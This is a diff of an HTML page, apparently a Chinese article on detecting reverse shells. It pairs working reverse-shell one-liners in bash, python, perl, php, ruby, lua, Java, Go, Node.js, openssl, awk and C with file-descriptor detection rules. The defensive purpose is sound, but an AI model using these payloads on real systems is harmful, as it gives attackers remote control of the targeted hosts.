@@ -108,8 +108,7 @@ var _hmt = _hmt || [];
 Listener:
 nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">1234</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG53.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG53.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了一个常住进程“bash -i”， 它的得0和1文件描述符都指向socket。</p>
 <p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
@@ -118,33 +117,29 @@ nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">1234</spa
 Listener:
 nc<span class="w"> </span>-u<span class="w"> </span>-lvp<span class="w"> </span><span class="m">1234</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG54.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了一个常住进程“sh -i”， 它的得0和1文件描述符都指向socket。</p>
 <p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span><code><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span><span class="w"> </span><span class="m">196</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span><span class="w"> </span>sh<span class="w"> </span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">196</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WeChat9c018fc36b0256b4286d528e3e91651a.png"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WeChat9c018fc36b0256b4286d528e3e91651a.png"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span><code><span class="nb">exec</span><span class="w"> </span><span class="m">5</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>line<span class="w"> </span><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nv">$line</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG56.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG56.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>匹配规则：某一个bash进程的0 文件描述符指向socket</p>
-<div class="highlight"><pre><span></span><code>nohup<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&#39;</span>
+<div class="highlight"><pre><span></span><code>nohup<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1'</span>
 
 base64搞一下命令
 
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;nohup bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&#39;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w0
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"nohup bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1'"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w0
 <span class="nb">echo</span><span class="w"> </span>bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYxJwo<span class="o">=</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash<span class="w"> </span><span class="m">2</span>&gt;/dev/null
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG55.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG55.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了bash进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：bash的0，和1文件描述符指向socket</p>
@@ -154,49 +149,42 @@ rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> <
 
 rm<span class="w"> </span>-f<span class="w"> </span>/tmp/bkpipe<span class="p">;</span>mknod<span class="w"> </span>/tmp/bkpipe<span class="w"> </span>p<span class="p">;</span>/bin/sh<span class="w"> </span><span class="m">0</span>&lt;/tmp/bkpipe<span class="w"> </span><span class="p">|</span><span class="w"> </span>telnet<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1234</span><span class="w"> </span><span class="m">1</span>&gt;/tmp/bkpipe
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG59.jpeg">
-<img alt="agent" src="../images/WechatIMG60.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG59.jpeg"/>
+<img alt="agent" class="img-fluid" src="../images/WechatIMG60.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了pipe。
 匹配规则：sh进程的0，和1文件描述符指向pipe</p>
 <div class="highlight"><pre><span></span><code>telnet<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1234</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span><span class="p">|</span><span class="w"> </span>telnet<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">12345</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG61.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG61.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了bash进程，0和1描述符都指向了pipe。
 匹配规则：bash进程的0，和1文件描述符指向pipe</p>
-<div class="highlight"><pre><span></span><code><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;use Socket;$i=&quot;127.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
 
-<span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">MIO</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;[127.0.0.1]:[1234]&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+<span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">MIO</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[127.0.0.1]:[1234]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span>
 </code></pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
+<div class="highlight"><pre><span></span><code><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">"127.0.0.1"</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">1234</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
 
-<p><img alt="agent" src="../images/WechatIMG54.jpeg"></p>
-<div class="highlight"><pre><span></span><code><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">1234</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
-
-<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG54.jpeg"></p>
-<div class="highlight"><pre><span></span><code><span class="x">php -r &#39;$sock=fsockopen(&quot;127.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
+<div class="highlight"><pre><span></span><code><span class="x">php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG54.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span><code><span class="x">php -r &#39;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234&quot;)&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="x">php -r 'exec("/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234")'</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG53.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG53.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了一个常住进程“bash -i”， 它的得0和1文件描述符都指向socket。</p>
 <p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span><code><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">rsocket</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&quot;127.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">rsocket</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG54.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
@@ -210,43 +198,39 @@ rm<span class="w"> </span>-f<span class="w"> </span>/tmp/bkpipe<span class="p">;
 
 rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w">  </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1234</span><span class="w"> </span>&gt;/tmp/f
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG62.jpeg">
-<img alt="agent" src="../images/WechatIMG63.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG62.jpeg"/>
+<img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了pipe，这两个pipe关联到文件和nc上。</p>
 <p>匹配规则：sh进程的0，和1文件描述符指向pipe</p>
-<div class="highlight"><pre><span></span><code><span class="nv">lua</span><span class="w"> </span><span class="o">-</span><span class="nv">e</span><span class="w"> </span><span class="s2">&quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;127.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span>
+<div class="highlight"><pre><span></span><code><span class="nv">lua</span><span class="w"> </span><span class="o">-</span><span class="nv">e</span><span class="w"> </span><span class="s2">"require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG54.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
 <p>Java</p>
 <div class="highlight"><pre><span></span><code><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">()</span>
-<span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="o">[</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="s">&quot;exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">)</span>
+<span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="o">[</span><span class="s">"/bin/bash"</span><span class="p">,</span><span class="s">"-c"</span><span class="p">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">)</span>
 <span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">()</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG56.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG56.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>匹配规则：某一个bash进程的0 文件描述符指向socket</p>
 <p>Golang</p>
-<div class="highlight"><pre><span></span><code><span class="nx">echo</span><span class="w"> </span><span class="err">&#39;</span><span class="kn">package</span><span class="w"> </span><span class="nx">main</span><span class="p">;</span><span class="kn">import</span><span class="s">&quot;os/exec&quot;</span><span class="p">;</span><span class="kn">import</span><span class="s">&quot;net&quot;</span><span class="p">;</span><span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">(){</span><span class="nx">c</span><span class="p">,</span><span class="nx">_</span><span class="o">:=</span><span class="nx">net</span><span class="p">.</span><span class="nx">Dial</span><span class="p">(</span><span class="s">&quot;tcp&quot;</span><span class="p">,</span><span class="s">&quot;127.0.0.1:1234&quot;</span><span class="p">);</span><span class="nx">cmd</span><span class="o">:=</span><span class="nx">exec</span><span class="p">.</span><span class="nx">Command</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Stdin</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Stdout</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Stderr</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Run</span><span class="p">()}</span><span class="err">&#39;</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">t</span><span class="p">.</span><span class="k">go</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">go</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">t</span><span class="p">.</span><span class="k">go</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">rm</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">t</span><span class="p">.</span><span class="k">go</span>
+<div class="highlight"><pre><span></span><code><span class="nx">echo</span><span class="w"> </span><span class="err">'</span><span class="kn">package</span><span class="w"> </span><span class="nx">main</span><span class="p">;</span><span class="kn">import</span><span class="s">"os/exec"</span><span class="p">;</span><span class="kn">import</span><span class="s">"net"</span><span class="p">;</span><span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">(){</span><span class="nx">c</span><span class="p">,</span><span class="nx">_</span><span class="o">:=</span><span class="nx">net</span><span class="p">.</span><span class="nx">Dial</span><span class="p">(</span><span class="s">"tcp"</span><span class="p">,</span><span class="s">"127.0.0.1:1234"</span><span class="p">);</span><span class="nx">cmd</span><span class="o">:=</span><span class="nx">exec</span><span class="p">.</span><span class="nx">Command</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Stdin</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Stdout</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Stderr</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">Run</span><span class="p">()}</span><span class="err">'</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">t</span><span class="p">.</span><span class="k">go</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">go</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">t</span><span class="p">.</span><span class="k">go</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">rm</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">t</span><span class="p">.</span><span class="k">go</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG64.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG64.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了pipe。
 匹配规则：sh进程的0，和1文件描述符指向pipe</p>
 <p>Nodejs</p>
 <div class="highlight"><pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
-<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;net&quot;</span><span class="p">),</span>
-<span class="w">        </span><span class="nx">cp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;child_process&quot;</span><span class="p">),</span>
-<span class="w">        </span><span class="nx">sh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[]);</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"net"</span><span class="p">),</span>
+<span class="w">        </span><span class="nx">cp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"child_process"</span><span class="p">),</span>
+<span class="w">        </span><span class="nx">sh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">,</span><span class="w"> </span><span class="p">[]);</span>
 <span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
-<span class="w">    </span><span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mf">1234</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(){</span>
+<span class="w">    </span><span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mf">1234</span><span class="p">,</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(){</span>
 <span class="w">        </span><span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
 <span class="w">        </span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
 <span class="w">        </span><span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
@@ -254,20 +238,18 @@ rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> <
 <span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="sr">/a/</span><span class="p">;</span><span class="w"> </span><span class="c1">// Prevents the Node.js application form crashing</span>
 <span class="p">})();</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG66.jpeg"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG66.jpeg"/></p>
 <p>目标机执行后的结果如下：
 创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span><code><span class="n">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/sh 127.0.0.1 1234&#39;</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><code><span class="n">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">)</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s1">'nc -e /bin/sh 127.0.0.1 1234'</span><span class="p">)</span>
 
 <span class="ow">or</span>
 
 <span class="o">-</span><span class="k">var</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">global</span><span class="o">.</span><span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span>
-<span class="o">-</span><span class="n">x</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s1">&#39;nc 127.0.0.1 1234 -e /bin/bash&#39;</span><span class="p">)</span>
+<span class="o">-</span><span class="n">x</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">)</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s1">'nc 127.0.0.1 1234 -e /bin/bash'</span><span class="p">)</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WechatIMG63.jpeg">
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/>
 目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了pipe，这两个pipe关联到nc进程上。nc创建了socket外联。</p>
 <p>匹配规则：sh进程的0，和1文件描述符指向pipe</p>
@@ -277,17 +259,14 @@ rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> <
 openssl<span class="w"> </span>s_server<span class="w"> </span>-quiet<span class="w"> </span>-key<span class="w"> </span>key.pem<span class="w"> </span>-cert<span class="w"> </span>cert.pem<span class="w"> </span>-port<span class="w"> </span>&lt;l_port&gt;<span class="w"> </span><span class="c1">#Here you will be able to introduce the commands</span>
 openssl<span class="w"> </span>s_server<span class="w"> </span>-quiet<span class="w"> </span>-key<span class="w"> </span>key.pem<span class="w"> </span>-cert<span class="w"> </span>cert.pem<span class="w"> </span>-port<span class="w"> </span>&lt;l_port2&gt;<span class="w"> </span><span class="c1">#Here yo will be able to get the response</span>
 </code></pre></div>
-
 <p>靶机</p>
 <div class="highlight"><pre><span></span><code>openssl<span class="w"> </span>s_client<span class="w"> </span>-quiet<span class="w"> </span>-connect<span class="w"> </span><span class="m">127</span>.0.0.1:1234<span class="p">|</span>/bin/bash<span class="p">|</span>openssl<span class="w"> </span>s_client<span class="w"> </span>-quiet<span class="w"> </span>-connect<span class="w"> </span><span class="m">127</span>.0.0.1:12345
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WeChat8872f342986ad270beb9f2cfed15620b.png">目标机执行后的结果如下：</p>
+<p><img alt="agent" class="img-fluid" src="../images/WeChat8872f342986ad270beb9f2cfed15620b.png"/>目标机执行后的结果如下：</p>
 <p>创建了bash进程，0和1描述符都指向了pipe。
 匹配规则：bash进程的0，和1文件描述符指向pipe</p>
-<div class="highlight"><pre><span></span><code>awk<span class="w"> </span><span class="s1">&#39;BEGIN {s = &quot;/inet/tcp/0/127.0.0.1/1234&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39;</span><span class="w"> </span>/dev/null
+<div class="highlight"><pre><span></span><code>awk<span class="w"> </span><span class="s1">'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span><span class="w"> </span>/dev/null
 </code></pre></div>
-
 <p>无明显文件句柄特征</p>
 <div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 <span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/socket.h&gt;</span>
@@ -304,7 +283,7 @@ openssl<span class="w"> </span>s_server<span class="w"> </span>-quiet<span class
 <span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">sockt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
 <span class="w">    </span><span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">;</span><span class="w">       </span>
 <span class="w">    </span><span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
